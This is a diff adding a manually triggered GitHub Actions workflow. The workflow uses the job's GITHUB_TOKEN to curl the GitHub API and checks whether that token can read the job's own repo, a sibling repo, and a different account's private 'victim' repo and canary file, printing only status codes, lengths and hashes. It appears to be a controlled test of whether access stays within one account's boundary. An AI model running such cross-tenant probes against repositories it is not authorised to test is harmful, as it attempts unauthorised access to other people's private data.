@@ -1,0 +1,36 @@
+name: c246-reach
+on: { workflow_dispatch: {} }
+jobs:
+  reach:
+    runs-on: ubuntu-latest
+    steps:
+      - name: measure what the job identity reaches
+        env:
+          JOBTOK: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          set -u
+          echo "=== POSITIVE CONTROL: is the job token even bound? ==="
+          echo "JOBTOK length = ${#JOBTOK}   (a real job token is 377; 0 means every arm below is void)"
+          if [ "${#JOBTOK}" -eq 0 ]; then echo "ABORT: empty token, arms uninterpretable"; exit 1; fi
+
+          probe () {
+            LBL="$1"; URL="$2"
+            OUT=$(curl -s -o /tmp/b -w '%{http_code}' -H "Authorization: token $JOBTOK" \
+                  -H 'Accept: application/vnd.github+json' -H 'User-Agent: c246' "$URL")
+            LEN=$(wc -c < /tmp/b); MD5=$(md5sum /tmp/b | cut -d' ' -f1)
+            echo "ARM $LBL -> status=$OUT len=$LEN md5=$MD5"
+          }
+
+          echo "=== A  OWN repo (the job's own) — MUST be 200 or nothing below is readable ==="
+          probe "A_own_runner_repo   " "https://api.github.com/repos/mr-benty/zz-c246-runner-0903"
+          echo "=== B  ANOTHER REPO, SAME OWNER (vendor-named eligible crossing: 'another repo') ==="
+          probe "B_same_owner_private" "https://api.github.com/repos/mr-benty/zz-hd-oidc-0902"
+          echo "=== C  DIFFERENT ACCOUNT, private (THE TENANT CROSSING) ==="
+          probe "C_cross_tenant_repo " "https://api.github.com/repos/neve-larsson/zz-c246-victim-0903"
+          echo "=== D  the cross-tenant CANARY FILE (the impact byte, md5 only) ==="
+          probe "D_cross_tenant_file " "https://api.github.com/repos/neve-larsson/zz-c246-victim-0903/contents/canary.txt"
+          echo "=== E  INVENTED repo, same shape (refusal-shape control) ==="
+          probe "E_invented_control  " "https://api.github.com/repos/neve-larsson/zz-c246-does-not-exist-qqqq"
+          echo "=== F  who is this token? ==="
+          probe "F_identity          " "https://api.github.com/installation/repositories"
+          echo "=== done (only statuses/lengths/md5 printed; the token is never echoed) ==="
